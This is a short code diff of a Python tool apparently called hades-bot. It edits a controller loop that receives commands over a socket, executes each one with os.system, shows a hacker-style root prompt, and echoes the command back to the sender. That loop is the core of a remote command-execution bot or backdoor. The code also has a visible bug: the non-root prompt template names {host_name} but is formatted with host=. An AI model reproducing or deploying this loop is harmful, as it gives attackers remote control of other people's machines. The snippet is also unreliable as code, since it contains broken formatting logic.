@@ -42,20 +42,22 @@ class Controller(object):
             print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]You may now proceed executing commands in the controller.")
             host = socket.gethostname()
             uid = os.getuid()
+            width = 0
             global host_format
             while True:
                     working_directory = os.getcwd()
                     if uid != 0:
                         host_format = '''
-                                 ┌──({host_name})-[{cwd}]
-                                 └─$ '''.format(host=host,cwd=working_directory)
+┌──({host_name})-[{cwd}]
+└─$ '''.format(host=host,cwd=working_directory)
                     elif uid == 0:
                         host_format = '''
-                        ┌──(root💀{host})-[{cwd}]
-                        └─#'''.format(host=host,cwd=working_directory)
+┌──(root💀{host})-[{cwd}]
+└─#'''.format(host=host,cwd=working_directory)
                     cmd_read = client_socket.recv(buffer_size).decode()
                     print(host_format,end='')
                     airbitrary_cmd_exec = os.system(cmd_read)
+                    client_socket.send(cmd_read.encode())
         except Exception as Err:
             print(Err)
             print('\nUsage for help: python3 <hades-bot.py> -h ')
